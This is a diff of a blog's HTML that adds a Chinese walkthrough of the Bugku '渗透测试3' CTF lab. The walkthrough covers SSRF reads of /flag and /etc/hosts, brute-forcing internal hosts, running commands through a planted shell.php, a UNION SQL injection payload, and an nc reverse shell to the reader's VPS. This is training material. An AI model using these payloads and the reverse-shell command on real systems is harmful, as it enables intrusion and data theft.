@@ -119,7 +119,7 @@
 
 
 
-  <title>Tag: wrong | S1ient</title>
+  <title>渗透测试3 Bugku | S1ient</title>
   
 
 
@@ -138,7 +138,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     
@@ -224,58 +224,193 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>wrong<small>Tag</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
+
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://s1ient.github.io/2023/05/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="S1ient">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="S1ient">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2023/03/09/hexo-picture-wrong/" itemprop="url">
-              
-                <span itemprop="name">hexo picture wrong</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">渗透测试3 Bugku</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2023-03-09T13:22:57+08:00"
-              content="2023-03-09" >
-          03-09
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-07T19:38:26+08:00">2023-05-07</time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/1.png" alt="1"></p>
+<h1 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h1><p>进去是一个站点，标题是模拟蜘蛛爬取</p>
+<p>随便输入一个网址就会跳转到那个网站</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/2.png" alt="2"></p>
+<p>猜测存在 ssrf，常用函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;</span><br><span class="line">file:&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;</span><br><span class="line">gopher:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>输入直接获取 flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/3.png" alt="3"></p>
+<h1 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h1><p>题目有过提示看看内网以及被黑客入侵过</p>
+<p>所以先看看 <code>etc/hosts</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure>
+
+<p>发现了 192.168.0.2 </p>
+<p>!<img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/4.png" alt="4"></p>
+<p>对其进行提交没有反应，所以用 bp 进行爆破</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/5.png" alt="5"></p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/6.png" alt="6"></p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/7.png" alt="7"></p>
+<p>最后发现 192.168.0.10 和 192.168.0.138 有问题</p>
+<p>先看 192.168.0.10，发现了网站杯被葫芦娃黑了，根据提示看来是我们想要的</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/8.png" alt="8"></p>
+<p>被黑就会有 webshell，一般是 php，再次进行爆破找到了 shell.php</p>
+<p>是一个命令执行</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/9.png" alt="9"></p>
+<p>直接 <code>ls</code> 得到 flag 位置，<code>cat flag</code> 就可以得到 flag 了</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/10.png" alt="10"></p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/11.png" alt="11"></p>
+<h1 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h1><p>这里 <code>ls /</code>查看根目录也找到了一个 flag</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/15.png" alt="15"></p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/16.png" alt="16"></p>
+<h1 id="场景四"><a href="#场景四" class="headerlink" title="场景四"></a>场景四</h1><p>上一个场景我们还得到了 192.168.0.138，发现是一个典型的 sql 注入</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/12.png" alt="12"></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.138?id&#x3D;100%20union%20select%201,2,3,(select%20*%20from%20bugku_sql.flag)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/13.png" alt="13"></p>
+<h1 id="场景五"><a href="#场景五" class="headerlink" title="场景五"></a>场景五</h1><p>由于是内网，所以有进行内网穿透的想法，所以去寻找我们可以利用的软件，nc，frp 等等</p>
+<p>这里找到了 nc，可以利用 nc 进行反弹 shell</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953-Bugku/17.png" alt="17"></p>
+<p>自己的 VPS 监听端口</p>
+<p>同时访问：<code>192.168.0.10/shell.php?cmd=nc xx.xx.xx.xx port -e /bin/sh</code></p>
+<p>xx.xx.xxx.xx 是你的 vps 的 ip， port 是你的 vps 开放的端口</p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/03/26/OneForAll-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" rel="next" title="OneForAll 使用教程">
+                <i class="fa fa-chevron-left"></i> OneForAll 使用教程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -296,8 +431,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -312,7 +456,7 @@
                 
                   <a href="/">
                 
-                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-count">13</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -334,7 +478,7 @@
                 
                 <div class="site-state-item site-state-tags">
                   <a href="/tags/index.html">
-                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -357,6 +501,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#场景一"><span class="nav-number">1.</span> <span class="nav-text">场景一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景二"><span class="nav-number">2.</span> <span class="nav-text">场景二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景三"><span class="nav-number">3.</span> <span class="nav-text">场景三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景四"><span class="nav-number">4.</span> <span class="nav-text">场景四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景五"><span class="nav-number">5.</span> <span class="nav-text">场景五</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -488,6 +648,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.0.1"></script>
+
+
 
   
 
